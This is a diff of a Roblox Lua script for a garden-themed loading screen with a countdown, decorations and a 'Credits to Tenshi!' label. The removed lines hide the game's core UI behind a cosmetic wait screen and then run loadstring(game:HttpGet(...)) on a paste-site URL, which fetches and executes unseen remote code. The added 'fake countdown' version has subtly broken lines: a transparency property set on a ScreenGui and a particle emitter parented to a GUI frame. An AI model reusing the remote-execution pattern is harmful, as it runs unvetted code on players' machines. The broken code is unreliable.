@@ -1,126 +1,151 @@
 local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local TweenService = game:GetService("TweenService")
-local Player = Players.LocalPlayer
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
-repeat task.wait() until Player:FindFirstChild("PlayerGui")
-
--- Disable default UI
-pcall(function()
-	for _, gui in ipairs(Enum.CoreGuiType:GetEnumItems()) do
-		StarterGui:SetCoreGuiEnabled(gui, false)
-	end
-	StarterGui:SetCore("TopbarEnabled", false)
-end)
-
--- Create ScreenGui
-local gui = Instance.new("ScreenGui")
-gui.Name = "NatureCountdownGui"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-gui.DisplayOrder = 9999
-gui.Parent = Player:WaitForChild("PlayerGui")
-
--- Full background frame
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.Position = UDim2.new(0, 0, 0, 0)
-background.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- white background
-background.Parent = gui
-
--- Decorations
-local function createDeco(imgId, size, position)
-	local image = Instance.new("ImageLabel")
-	image.BackgroundTransparency = 1
-	image.Size = size
-	image.Position = position
-	image.Image = imgId
-	image.Parent = background
-	return image
+-- Remove existing UI if any
+if playerGui:FindFirstChild("GardenLoadUI") then
+	playerGui:FindFirstChild("GardenLoadUI"):Destroy()
 end
 
--- Vines, Flowers, Fruits, Tree Images (you can replace with your actual asset IDs)
-createDeco("rbxassetid://6031097225", UDim2.new(0.2, 0, 0.2, 0), UDim2.new(0, 0, 0, 0)) -- top left vines
-createDeco("rbxassetid://6031625164", UDim2.new(0.15, 0, 0.15, 0), UDim2.new(0.85, 0, 0, 0)) -- top right flower
-createDeco("rbxassetid://6031763426", UDim2.new(0.12, 0, 0.12, 0), UDim2.new(0.05, 0, 0.8, 0)) -- banana
-createDeco("rbxassetid://6031763571", UDim2.new(0.12, 0, 0.12, 0), UDim2.new(0.8, 0, 0.75, 0)) -- grapes
-createDeco("rbxassetid://6031763160", UDim2.new(0.13, 0, 0.13, 0), UDim2.new(0.4, 0, 0.85, 0)) -- apple
-createDeco("rbxassetid://6031218333", UDim2.new(0.2, 0, 0.25, 0), UDim2.new(0.02, 0, 0.45, 0)) -- small tree
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GardenLoadUI"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
 
--- UI Main Card
-local card = Instance.new("Frame")
-card.Size = UDim2.new(0.4, 0, 0.45, 0)
-card.Position = UDim2.new(0.5, 0, 0.5, 0)
-card.AnchorPoint = Vector2.new(0.5, 0.5)
-card.BackgroundColor3 = Color3.fromRGB(245, 245, 255) -- light blue-white
-card.BorderSizePixel = 0
-card.Parent = background
+-- Fullscreen Background
+local bg = Instance.new("Frame")
+bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BorderSizePixel = 0
+bg.ZIndex = 0
+bg.Parent = screenGui
 
-local corner = Instance.new("UICorner", card)
+-- Decorations (fruits, vines, flowers)
+local decorations = {
+	{img="rbxassetid://507845210", pos=UDim2.new(0, 10, 0, 10)},
+	{img="rbxassetid://507845159", pos=UDim2.new(1, -80, 0, 20)},
+	{img="rbxassetid://507845297", pos=UDim2.new(0, 20, 1, -100)},
+	{img="rbxassetid://507845432", pos=UDim2.new(0.5, -100, 0, 0)},
+	{img="rbxassetid://507845606", pos=UDim2.new(1, -90, 1, -90)}
+}
+
+for _, item in pairs(decorations) do
+	local img = Instance.new("ImageLabel")
+	img.Image = item.img
+	img.Size = UDim2.new(0, 64, 0, 64)
+	img.Position = item.pos
+	img.BackgroundTransparency = 1
+	img.ZIndex = 1
+	img.Parent = bg
+end
+
+-- Main UI Panel
+local panel = Instance.new("Frame")
+panel.AnchorPoint = Vector2.new(0.5, 1)
+panel.Position = UDim2.new(0.5, 0, 0.95, 0)
+panel.Size = UDim2.new(0, 320, 0, 160)
+panel.BackgroundColor3 = Color3.fromRGB(240, 245, 255)
+panel.BackgroundTransparency = 0.05
+panel.BorderSizePixel = 0
+panel.ZIndex = 2
+panel.Parent = screenGui
+panel.ClipsDescendants = true
+panel:TweenPosition(panel.Position, Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.4, true)
+
+local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 20)
+corner.Parent = panel
 
--- Top message
-local topLabel = Instance.new("TextLabel", card)
-topLabel.Size = UDim2.new(1, -20, 0.2, 0)
-topLabel.Position = UDim2.new(0, 10, 0.05, 0)
-topLabel.BackgroundTransparency = 1
-topLabel.TextColor3 = Color3.fromRGB(255, 150, 200) -- light pink
-topLabel.Font = Enum.Font.Cartoon
-topLabel.TextScaled = true
-topLabel.Text = "Waiting to Load Script Patient"
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0.1, 0)
+title.BackgroundTransparency = 1
+title.Text = "Waiting to Load Script Patiently"
+title.TextColor3 = Color3.fromRGB(255, 160, 190)
+title.Font = Enum.Font.FredokaOne
+title.TextScaled = true
+title.ZIndex = 3
+title.Parent = panel
 
--- Countdown
-local text = Instance.new("TextLabel", card)
-text.Size = UDim2.new(1, -20, 0.35, 0)
-text.Position = UDim2.new(0, 10, 0.3, 0)
-text.BackgroundTransparency = 1
-text.TextColor3 = Color3.fromRGB(100, 180, 150)
-text.Font = Enum.Font.Cartoon
-text.TextScaled = true
-text.Text = "60s"
+-- Countdown Label
+local counter = Instance.new("TextLabel")
+counter.Size = UDim2.new(1, 0, 0, 50)
+counter.Position = UDim2.new(0, 0, 0.35, 0)
+counter.BackgroundTransparency = 1
+counter.Text = "50s"
+counter.TextColor3 = Color3.fromRGB(100, 200, 150)
+counter.Font = Enum.Font.GothamBlack
+counter.TextScaled = true
+counter.ZIndex = 3
+counter.Parent = panel
 
--- Countdown animation
-task.spawn(function()
-	while true do
-		local tween = TweenService:Create(text, TweenInfo.new(0.6), {TextColor3 = Color3.fromRGB(140, 255, 180)})
-		tween:Play()
-		tween.Completed:Wait()
-		local tweenBack = TweenService:Create(text, TweenInfo.new(0.6), {TextColor3 = Color3.fromRGB(100, 180, 150)})
-		tweenBack:Play()
-		tweenBack.Completed:Wait()
-	end
-end)
-
--- Side message (bottom)
-local sideLabel = Instance.new("TextLabel", card)
-sideLabel.Size = UDim2.new(0.9, 0, 0.15, 0)
-sideLabel.Position = UDim2.new(0.05, 0, 0.72, 0)
-sideLabel.BackgroundTransparency = 1
-sideLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-sideLabel.Font = Enum.Font.Cartoon
-sideLabel.TextScaled = true
-sideLabel.TextWrapped = true
-sideLabel.Text = "Be patient if it's not loading or looks stuck!"
+-- Subtext
+local subtext = Instance.new("TextLabel")
+subtext.Size = UDim2.new(1, 0, 0, 30)
+subtext.Position = UDim2.new(0, 0, 0.65, 0)
+subtext.BackgroundTransparency = 1
+subtext.Text = "Be patient if it's not loading or looks stuck!"
+subtext.TextColor3 = Color3.fromRGB(140, 140, 140)
+subtext.Font = Enum.Font.Gotham
+subtext.TextScaled = true
+subtext.ZIndex = 3
+subtext.Parent = panel
 
 -- Credits
-local bottomLabel = Instance.new("TextLabel", card)
-bottomLabel.Size = UDim2.new(1, -20, 0.1, 0)
-bottomLabel.Position = UDim2.new(0, 10, 0.88, 0)
-bottomLabel.BackgroundTransparency = 1
-bottomLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
-bottomLabel.Font = Enum.Font.Cartoon
-bottomLabel.TextScaled = true
-bottomLabel.Text = "Credits to Tenshi!"
+local credit = Instance.new("TextLabel")
+credit.Size = UDim2.new(1, 0, 0, 25)
+credit.Position = UDim2.new(0, 0, 0.83, 0)
+credit.BackgroundTransparency = 1
+credit.Text = "Credits to Tenshi!"
+credit.TextColor3 = Color3.fromRGB(100, 180, 255)
+credit.Font = Enum.Font.Gotham
+credit.TextScaled = true
+credit.ZIndex = 3
+credit.Parent = panel
 
--- Countdown logic
-local t = 60
-task.spawn(function()
-	while t > 0 do
-		text.Text = tostring(t) .. "s"
-		task.wait(1)
-		t -= 1
+-- Fake Countdown Logic
+local seconds = 80
+coroutine.wrap(function()
+	while seconds > 0 do
+		counter.Text = seconds .. "s"
+		seconds -= 1
+		wait(1)
 	end
-	text.Text = "Loading..."
-	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
-end)
+	counter.Text = "Loading..."
+
+	wait(3)
+
+	-- Smooth fade out
+	for i = 1, 10 do
+		screenGui.BackgroundTransparency = i / 10
+		panel.BackgroundTransparency = i / 10
+		for _, child in pairs(panel:GetChildren()) do
+			if child:IsA("TextLabel") then
+				child.TextTransparency = i / 10
+			end
+		end
+		wait(0.05)
+	end
+	screenGui:Destroy()
+end)()
+
+-- 🌧️ Rain effect using particles
+local rain = Instance.new("ParticleEmitter")
+rain.Parent = bg
+rain.Texture = "rbxassetid://241876452" -- raindrop texture
+rain.Size = NumberSequence.new(0.2)
+rain.Lifetime = NumberRange.new(1.5, 2.5)
+rain.Rate = 150
+rain.Speed = NumberRange.new(20, 30)
+rain.Rotation = NumberRange.new(0, 360)
+rain.VelocitySpread = 180
+rain.LightInfluence = 0
+rain.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3), NumberSequenceKeypoint.new(1, 1)})
+rain.RotSpeed = NumberRange.new(50)
+rain.ZOffset = 1
+rain.LockedToPart = true
+rain.Acceleration = Vector3.new(0, -60, 0)
+rain.Enabled = true
